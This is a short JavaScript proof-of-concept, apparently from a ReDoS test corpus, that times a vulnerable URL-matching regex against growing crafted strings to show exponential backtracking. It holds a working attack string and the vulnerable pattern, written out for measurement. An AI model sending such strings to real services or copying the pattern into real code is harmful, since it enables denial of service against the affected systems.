/* 4154
 * ^(?<link>((?<prot>http:\/\/)*(?<subdomain>(www|[^\-\n]*)*)(\.)*(?<domain>[^\-\n]+)\.(?<after>[a-zA-Z]{2,3}[^>\n]*)))$
 * EXPONENT
 * nums:3
 * EXPONENT AttackString:":."+"aa"*8+"@1 _SLQ_2"
 */
var REGEX = new RegExp("^(?<link>((?<prot>http:\/\/)*(?<subdomain>(www|[^\-\n]*)*)(\.)*(?<domain>[^\-\n]+)\.(?<after>[a-zA-Z]{2,3}[^>\n]*)))$")
for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = ':.' + 'aa'.repeat(i*1) + '@1 _SLQ_2'
    REGEX.exec(attack_str)
    // REGEX.test(attack_str);
    // attack_str.search(REGEX)
    // attack_str.match(REGEX)
    var time_cost = Date.now() - time;
    console.log(i * 1 + ": " + time_cost+" ms")
}